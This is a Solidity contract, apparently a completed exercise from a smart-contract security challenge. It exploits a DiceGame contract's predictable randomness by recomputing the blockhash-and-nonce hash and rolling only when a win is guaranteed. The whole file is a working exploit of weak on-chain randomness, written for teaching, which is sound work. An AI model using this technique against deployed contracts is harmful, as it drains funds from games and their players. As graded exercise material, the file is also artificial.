pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable _addr, uint256 _amount) external onlyOwner {
        require(_addr != address(0), "Cannot withdraw to zero address");
        require(_amount <= address(this).balance, "Insufficient contract balance");
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Withdraw failed");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() external {
        require(address(this).balance >= 0.002 ether, "RiggedRoll: contract balance too low");
        // Replicate DiceGame's randomness
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        if (roll > 5) {
            revert("Not a winning roll");
        }
        // Use contract's own balance to play
        uint256 playAmount = 0.002 ether;
        diceGame.rollTheDice{value: playAmount}();
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
    
}
